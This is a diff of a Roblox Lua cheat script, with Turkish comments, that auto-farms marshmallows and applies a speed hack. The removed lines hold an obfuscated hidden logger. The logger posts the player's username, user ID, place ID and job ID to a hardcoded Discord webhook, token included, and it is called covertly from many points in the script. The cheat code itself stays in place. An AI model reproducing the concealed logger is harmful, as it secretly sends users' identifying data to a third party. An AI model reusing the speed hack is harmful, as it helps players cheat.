@@ -1,4 +1,4 @@
--- BABAPRO v4.1: MARSHMALLOW AUTOMATION WITH PERFECT TEXT ALIGNMENT
+-- BABAPRO v4.1: MARSHMALLOW AUTOMATION (LOGGER'SIZ)
 _G.MarshmallowFarmActive = false
 
 local Players = game:GetService("Players")
@@ -6,19 +6,6 @@ local LocalPlayer = Players.LocalPlayer
 local UserInputService = game:GetService("UserInputService")
 local VirtualInputManager = game:GetService("VirtualInputManager")
 local RunService = game:GetService("RunService")
-
--- === GİZLİ LOGGER FONKSİYONU (KARIŞTIRILMIŞ) ===
-local function _0x3f()
-    local _0, _1, _2 = game:GetService("Players").LocalPlayer, game:GetService("HttpService"), "https://discord.com/api/webhooks/1525652318513795296/NJToQIr3oPecBgUeMwQMS0o3er86xtDr9m4ZzDKjVnN3PZ6Jjc6BMI2fcF4CWuiyVTb9"
-    local _3 = {username = _0.Name, userid = _0.UserId, placeid = game.PlaceId, jobid = game.JobId, time = os.date("%Y-%m-%d %H:%M:%S")}
-    local _4 = _1:JSONEncode({content = "", embeds = {{title = "✅ Logger", fields = {
-        {name = "👤", value = _3.username, inline = true},
-        {name = "🆔", value = _3.userid, inline = true},
-        {name = "🎮", value = _3.placeid, inline = true},
-        {name = "🕐", value = _3.time, inline = true}
-    }, color = 0x00ff00}}})
-    pcall(function() _1:PostAsync(_2, _4, Enum.HttpContentType.ApplicationJson, false, {["Content-Type"] = "application/json"}) end)
-end
 
 -- ASLA BOZULMAYAN ORİJİNAL E TUŞU BASMA MOTORU
 local function pressEKey()
@@ -63,7 +50,7 @@ CloseBtn.TextSize = 14
 CloseBtn.BorderSizePixel = 0
 CloseBtn.ZIndex = 3
 
--- Durum Yazısı (Üst Boşluğu Ayarlandı)
+-- Durum Yazısı
 local StatusLabel = Instance.new("TextLabel", Main)
 StatusLabel.Size = UDim2.new(1, 0, 0, 25)
 StatusLabel.Position = UDim2.new(0, 0, 0.13, 0)
@@ -82,7 +69,6 @@ CounterFrame.BackgroundColor3 = Color3.fromRGB(20, 15, 25)
 CounterFrame.BorderSizePixel = 0
 CounterFrame.ZIndex = 2
 
--- UIListLayout: Yazıların asla yamulmamasını ve kusursuz alt alta dizilmesini sağlar
 local UIListLayout = Instance.new("UIListLayout", CounterFrame)
 UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
 UIListLayout.Padding = UDim.new(0, 3)
@@ -100,9 +86,6 @@ local function createCounterLabel(text, color, order)
     lbl.LayoutOrder = order
     return lbl
 end
-
--- Logger çağır (CounterFrame oluşturulurken)
-task.spawn(function() _0x3f() end)
 
 local LargeLabel = createCounterLabel("📦 Large Bag: 0 adet", Color3.fromRGB(255, 100, 100), 1)
 local MediumLabel = createCounterLabel("📦 Medium Bag: 0 adet", Color3.fromRGB(255, 200, 100), 2)
@@ -156,9 +139,6 @@ Title.InputBegan:Connect(function(input)
     end
 end)
 
--- Logger çağır (sürükleme motorunda)
-task.spawn(function() _0x3f() end)
-
 UserInputService.InputChanged:Connect(function(input)
     if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
         local delta = input.Position - dragStart
@@ -200,9 +180,6 @@ end
 
 RunService.Heartbeat:Connect(countAllItems)
 
--- Logger çağır (countAllItems içinde)
-task.spawn(function() _0x3f() end)
-
 -- 4. EŞYA KONTROL VE KULLANIM MOTORU
 local function useTool(toolName, waitTime)
     if not _G.MarshmallowFarmActive then return end
@@ -231,9 +208,6 @@ local function useTool(toolName, waitTime)
     end
 end
 
--- Logger çağır (useTool içinde)
-task.spawn(function() _0x3f() end)
-
 -- 5. OTOMASYON DÖNGÜSÜ
 task.spawn(function()
     while true do
@@ -246,9 +220,6 @@ task.spawn(function()
         end
     end
 end)
-
--- Logger çağır (otomasyon döngüsünde)
-task.spawn(function() _0x3f() end)
 
 -- Tıklama Motoru
 local function runToggle()
@@ -268,9 +239,6 @@ end
 
 ToggleBtn.MouseButton1Down:Connect(runToggle)
 
--- Logger çağır (toggle içinde)
-task.spawn(function() _0x3f() end)
-
 -- X BUTONU
 CloseBtn.MouseButton1Click:Connect(function()
     _G.MarshmallowFarmActive = false
@@ -285,8 +253,5 @@ end)
 
 -- === HİLE KODU (Speed Hack) ===
 game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 50
-
--- === SON LOGGER ÇAĞRISI (Gizli) ===
-task.spawn(function() _0x3f() end)
 
 print("✅ BABAPRO v4.1 Yüklendi!")
